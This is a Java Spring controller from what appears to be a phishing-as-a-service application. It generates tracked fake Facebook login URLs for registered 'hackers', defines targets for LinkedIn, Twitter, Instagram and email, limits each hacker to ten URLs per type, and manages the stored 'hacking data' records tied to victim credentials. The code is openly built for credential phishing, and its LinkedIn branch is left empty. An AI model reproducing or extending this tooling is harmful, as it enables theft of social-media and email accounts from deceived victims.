package com.hack.demo.controller;

import com.hack.demo.entity.Hacker;
import com.hack.demo.entity.HackingData;
import com.hack.demo.entity.VictimCredential;
import com.hack.demo.repository.HackerRepository;
import com.hack.demo.repository.HackingDataRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import javax.validation.constraints.Email;
import java.security.Principal;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import static com.hack.demo.entity.VictimCredential.*;

@Controller
public class AttackController {

    public static final String[] types = {FACEBOOK, LINKEDIN, TWITTER, INSTAGRAM, EMAIL};

    @Autowired
    private HackerRepository hackerRepository;
    @Autowired
    private HackingDataRepository hackingDataRepository;

    @RequestMapping(value = "/attack-facebook", method = RequestMethod.GET)
    public String attackFacebookPage(){
        return "attack_facebook";
    }

    @ResponseBody
    @RequestMapping(value = "/create-phishing-url", method = RequestMethod.POST)
    public ResponseEntity<Map<String, String>> createPhishingURL(Principal principal, @RequestParam String type,
                                                                         @RequestParam String redirectUrl){
        System.out.println("# Type : " + type);
        System.out.println("# RedirectURL : " + redirectUrl);
        Map<String, String> map = new HashMap<>();
        if (Arrays.stream(types).anyMatch(t-> t.equals(type)) && isValidURL(redirectUrl)){

            String hackerEmail =  principal.getName();
            String hackerId = hackerRepository.findHackerIdByEmail(hackerEmail);

            long count = hackingDataRepository.countHackingDataByHackerEmailAndHackerIdAndType(hackerEmail, hackerId, type);
            if (count < 10) {
                map.put("status", "success");
                String url = "";
                long trackId = System.currentTimeMillis();
                if (type.equals(types[0])) { // FACEBOOK
                    url = "facebook/login.php?id=" + hackerId + "&t=" + trackId;
                } else if (type.equals(types[1])) { // LINKEDIN

                }
                HackingData hackingData = new HackingData();
                hackingData.setHackerEmail(hackerEmail);
                hackingData.setHackerId(hackerId);
                hackingData.setTrackId(String.valueOf(trackId));
                hackingData.setType(type);
                hackingData.setRedirectUrl(redirectUrl);
                hackingData.setAttackingUrl(url);
                hackingDataRepository.save(hackingData);
                map.put("attacking_url", url);
            } else {
                map.put("status", "failed");
                map.put("message", "You can't create '"+type.toLowerCase()+"' type attacking url more than 10.");
            }

        }else{
            map.put("status", "failed");
            map.put("message", "Invalid 'Redirect url' Or 'Type'");
        }
        return ResponseEntity.ok(map);
    }

    public static boolean isValidURL(String url)
    {
        String regex = "((http|https)://)(www.)?"
                + "[a-zA-Z0-9@:%._\\+~#?&//=]"
                + "{2,256}\\.[a-z]"
                + "{2,6}\\b([-a-zA-Z0-9@:%"
                + "._\\+~#?&//=]*)";
        Pattern p = Pattern.compile(regex);
        if (url == null) {
            return false;
        }
        Matcher m = p.matcher(url);
        return m.matches();
    }

    @RequestMapping("/fetch-hacking-data-table")
    public String fetchHackingDataTable(Principal principal, Model model, @RequestParam String type){
        List<HackingData> hackingDataList = hackingDataRepository.findAllByHackerEmailAndType(principal.getName(), type);
        model.addAttribute("data", hackingDataList);
        return "hacking_data_table";
    }

    @RequestMapping(value = "/delete-hacking-data", method = RequestMethod.POST)
    public String deleteHackingData(Principal principal, @RequestParam String trackId, @RequestParam String type){
        System.out.println("# Track Id: "+trackId+",  Type: "+ type);
        hackingDataRepository.deleteHackingDataByHackerEmailAndTrackIdAndType(principal.getName(), trackId, type);
        return "redirect:/fetch-hacking-data-table?type="+type;
    }

}
